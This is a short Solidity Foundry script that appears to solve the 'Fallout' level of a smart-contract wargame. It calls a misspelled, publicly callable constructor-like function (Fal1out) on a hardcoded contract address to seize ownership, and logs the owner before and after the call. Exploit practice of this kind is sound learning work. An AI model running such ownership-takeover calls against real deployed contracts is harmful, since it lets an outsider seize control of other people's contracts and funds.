// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface Fallout {
    function owner() external view returns (address);
    function Fal1out() external payable;
}

contract FalloutSolution is Script {

    Fallout public falloutInstance =
        Fallout(0xA0E1e8996409905f8d6904b31B6B69420Df2431C);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before:", falloutInstance.owner());

        falloutInstance.Fal1out();

        console.log("Owner after:", falloutInstance.owner());

        vm.stopBroadcast();
    }
}